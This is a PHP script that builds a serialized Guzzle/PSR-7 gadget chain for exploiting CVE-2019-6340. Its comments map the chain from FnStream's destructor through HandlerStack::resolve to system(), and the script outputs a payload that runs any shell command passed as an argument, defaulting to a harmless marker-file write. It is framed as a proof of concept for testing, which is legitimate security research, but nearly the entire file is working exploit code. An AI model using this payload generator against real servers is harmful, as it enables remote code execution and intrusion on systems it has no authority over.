<?php
// Generate a Guzzle 6.3 + PSR-7 1.4 gadget chain for CVE-2019-6340 testing.
//
// Chain:  GuzzleHttp\Psr7\FnStream::__destruct()
//            -> call_user_func($this->_fn_close)
//         $this->_fn_close = [ $handlerStack, 'resolve' ]
//         GuzzleHttp\HandlerStack::resolve() does:
//            $prev = $this->handler;                 // = the shell command
//            foreach (array_reverse($this->stack) as $fn) { $prev = $fn[0]($prev); }
//         with stack = [ ['system','x'] ]  ->  system($command)
//
// This script only *serializes*. The stub classes define NO destructor, so
// running it never executes the command (it is safe to run outside the target).
//
// Usage: php gen-gadget.php 'echo RQ-C1-POC-MARKER > /tmp/rq-c1-poc-marker'

namespace GuzzleHttp {
    class HandlerStack {
        private $handler;   // declared private -> serialized name is mangled with NUL
        private $stack;
        private $cached;
        public function __construct($handler, $stack) {
            $this->handler = $handler;
            $this->stack   = $stack;
            $this->cached  = false;
        }
    }
}

namespace GuzzleHttp\Psr7 {
    class FnStream {
        // real class creates this dynamically (public) via $this->{'_fn_'.$name}
        public $_fn_close;
        public function __construct($close) { $this->_fn_close = $close; }
    }
}

namespace {
    $cmd = $argv[1] ?? 'echo RQ-C1-POC-MARKER > /tmp/rq-c1-poc-marker';
    $handler = new \GuzzleHttp\HandlerStack($cmd, [['system', 'x']]);
    $stream  = new \GuzzleHttp\Psr7\FnStream([$handler, 'resolve']);
    echo serialize($stream), "\n";
}
